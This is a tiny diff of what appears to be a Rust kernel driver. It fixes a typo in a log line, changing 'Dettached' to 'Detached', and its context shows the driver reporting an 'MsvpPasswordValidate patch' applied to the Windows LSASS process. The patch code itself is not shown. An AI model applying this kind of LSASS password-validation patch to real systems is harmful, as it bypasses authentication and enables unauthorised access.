@@ -154,6 +154,6 @@ pub unsafe extern "C" fn load_image_callback(
         log::info!("[+] MsvpPasswordValidate patch applied!");
         KeDetachProcess();
         ObDereferenceObject(process.0 as _);
-        log::info!("[*] Dettached from LSASS process");
+        log::info!("[*] Detached from LSASS process");
     }
 }
